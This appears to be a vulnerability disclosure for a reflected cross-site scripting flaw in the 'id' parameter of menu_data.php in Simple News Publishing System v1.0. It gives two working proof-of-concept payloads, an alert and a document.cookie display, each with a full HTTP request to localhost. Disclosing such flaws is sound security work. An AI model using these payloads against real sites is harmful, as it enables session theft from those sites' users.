# Simple News Publishing System v1.0 by razormist has Cross-site scripting (reflected)

BUG_Author: Akela

vendors:https://www.sourcecodester.com/php/14413/simple-news-publishing-system.html

Vulnerability File: /Simple News Publishing System/includes/menu_data.php

GET parameter 'id' exists Cross-site scripting vulnerability

Payload1: id="><script>alert('xss')</script>

```
GET /Simple%20News%20Publishing%20System/includes/menu_data.php?id=%22%3E%3Cscript%3Ealert(%27xss%27)%3C/script%3E HTTP/1.1
Host: localhost
Cache-Control: max-age=0
sec-ch-ua: "Chromium";v="97", " Not;A Brand";v="99"
sec-ch-ua-mobile: ?0
sec-ch-ua-platform: "Windows"
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.71 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Sec-Fetch-Site: none
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9,zh-CN;q=0.8,zh;q=0.7
Cookie: PHPSESSID=h2td7dda0p1f3dha0mjlejh9vb
Connection: close
```

![image](https://github.com/XDWHQ/pic/blob/main/xss.png)

Payload2: id="><script>alert(document.cookie)</script>

```
GET /Simple%20News%20Publishing%20System/includes/menu_data.php?id=%22%3E%3Cscript%3Ealert(document.cookie)%3C/script%3E HTTP/1.1
Host: localhost
sec-ch-ua: "Chromium";v="97", " Not;A Brand";v="99"
sec-ch-ua-mobile: ?0
sec-ch-ua-platform: "Windows"
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.71 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Sec-Fetch-Site: none
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9,zh-CN;q=0.8,zh;q=0.7
Cookie: PHPSESSID=h2td7dda0p1f3dha0mjlejh9vb
Connection: close
```

![image](https://github.com/XDWHQ/pic/blob/main/cookie.png)

